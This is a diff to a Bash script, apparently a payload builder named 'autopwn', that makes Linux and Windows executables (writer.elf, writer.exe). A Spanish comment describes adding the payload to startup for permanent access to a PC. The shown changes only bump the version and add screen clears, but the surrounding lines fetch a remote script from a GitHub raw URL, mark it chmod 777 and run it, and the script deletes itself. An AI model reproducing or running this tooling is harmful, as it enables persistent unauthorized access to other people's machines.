@@ -1,6 +1,6 @@
 #!/bin/bash
 
-version="1.2"
+version="1.3"
 
 # Variables
 youripalways=`ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1'`
@@ -30,6 +30,8 @@ startup="no" # añade el payload al inicio para que siempre tengas acceso al PC
 linuxoutname="writer.elf"
 windowsoutname="writer.exe"
 
+clear
+
 webcon="`curl -s "https://raw.githubusercontent.com/pepemanaca/hthethrfdt/main/autopwn.txt" | cat`"
 
 color_transition() {
@@ -53,6 +55,7 @@ else
     kill $color_pid
     rm -f "$0"
     wget https://raw.githubusercontent.com/pepemanaca/hthethrfdt/main/autopwn.txt -O autopwn.sh
+    clear
     chmod 777 autopwn.sh
     while [ ! -f "autopwn.sh" ]; do
     sleep 1
